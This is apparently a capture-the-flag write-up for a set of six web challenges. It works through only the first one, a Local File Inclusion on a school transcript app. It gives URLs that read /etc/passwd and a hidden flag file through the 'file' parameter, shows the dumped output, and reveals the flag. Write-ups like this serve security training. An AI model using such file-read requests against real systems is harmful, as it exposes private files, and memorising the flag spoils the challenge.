# SecTech (6 challenges)

### Summary
1. LFI -> Flag
2. IDOR -> Flag
3. Insecure Deserialization -> Flag
4. XSS in PDF Generator -> Flag
5. SSRF to AWS Metadata -> Flag
6. Misconfigured S3 Bucket -> OSINT of Github Account -> Sensitive Information Disclosure in Git Commits -> Flag

# GovTech SecTech (1/6) - LFI
### Description
WhiteHacks SecTech is an application for SecTech school staff to login to the system and to view students grades and to generate transcripts. However, could you perhaps view more than transcripts?
### Solution

Notice in the 'View Transcript' functionality - http://sec-tech.cf/transcript.php?user=temp_acc&password=temp_pass&user_id=1&file=transcript.html

There is a 'file' parameter, these types of parameters are usually vulnerable to Local File Inclusion

We can dump the /etc/passwd file - http://sec-tech.cf/transcript.php?user=temp_acc&password=temp_pass&user_id=1&file=/etc/passwd

``````
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List 
Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time 
Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd 
Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:105::/nonexistent:/usr/sbin/nologin avahi:x:105:110:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin 
geoclue:x:106:111::/var/lib/geoclue:/usr/sbin/nologin admin:x:1000:1000:admin:/home/admin:/secret_path/lfi_flag.txt 
``````
Notice the last line?
``````
admin:x:1000:1000:admin:/home/admin:/secret_path/lfi_flag.txt 
``````
Let's visit that - http://sec-tech.cf/transcript.php?user=temp_acc&password=temp_pass&user_id=1&file=/secret_path/lfi_flag.txt 

Flag:
WH2020{Loc@l_F1l3_Inclus10n_buT_N0t_sh3ll}
